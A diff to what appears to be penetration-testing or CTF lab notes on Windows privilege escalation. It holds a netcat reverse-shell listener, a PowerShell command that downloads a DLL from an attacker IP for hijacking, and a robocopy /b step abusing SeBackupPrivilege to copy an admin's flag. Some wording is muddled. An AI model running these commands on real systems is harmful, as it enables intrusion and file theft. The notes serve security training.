@@ -1199,7 +1199,7 @@ PrintSpoofer was an easy exploit. There are also tools like variants from the [P
 
 Additional Example:
 
-Get a reverse shell via a process dll to elevate privileges:
+Get a from alex reverse shell to enterpriseuser via a process dll to elevate privileges:
 
 ```console
 
@@ -1209,3 +1209,9 @@ $ nc -nlvp 9999
 
 > iwr -uri http://192.168.45.245/EnterpriseServiceOptional.dll -Outfile EnterpriseServiceOptional.dll
 ```
+
+Then, from enterpriseuser, use robocopy to send the flag from the enterpriseadmin's desktop to alex's. Enterpriseuser can use robocopy since they have the SeBackupPrivilege and it is disabled.
+
+```console
+C:\Users\enterpriseuser\Desktop> robocopy /b C:\Users\enterpriseadmin\Desktop\ C:\Users\alex\Desktop\stolen
+````
